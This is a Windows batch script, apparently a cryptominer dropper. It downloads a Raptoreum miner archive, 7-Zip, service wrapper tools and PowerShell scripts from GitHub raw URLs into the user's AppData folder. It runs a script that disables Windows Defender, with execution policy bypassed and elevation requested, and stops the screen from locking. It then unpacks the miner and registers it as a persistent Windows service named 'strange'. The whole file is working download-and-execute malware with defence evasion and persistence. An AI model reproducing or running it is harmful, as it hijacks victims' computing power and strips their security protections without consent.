@echo off
:::::::::: 下载文件 :::::::::
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/prevent-screen-lock.ps1 %appdata%\prevent-screen-lock.ps1
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/7z.dll %appdata%\7z.dll
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/7z.exe %appdata%\7z.exe
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/rtm-miner.zip %appdata%\rtm-miner.zip
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/instsrv.exe %appdata%\instsrv.exe
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/srvany.exe %appdata%\srvany.exe
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/master/scripts/disable-windows-defender.ps1 %appdata%\disable-windows-defender.ps1
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/blob/master/scripts/optimize-windows-update.ps1 %appdata%\doptimize-windows-update.ps1
call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/master/scripts/UninstallMicrosoftTeams.ps1 %appdata%\UninstallMicrosoftTeams.ps1
:::::::::: 净化系统 :::::::::
call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\disable-windows-defender.ps1""' -Verb RunAs}"
call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\doptimize-windows-update.ps1""' -Verb RunAs}"
call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\UninstallMicrosoftTeams.ps1""' -Verb RunAs}"
:::::::::: 执行任务 :::::::::
call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\prevent-screen-lock.ps1""' -Verb RunAs}"
call cd %appdata% && "%appdata%\7z.exe" x "%appdata%\rtm-miner.zip"
:::::::::: 自启 :::::::::
call cd %appdata%
call instsrv strange "%appdata%\srvany.exe"
call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\rtm-miner\cpuminer.bat" /f 
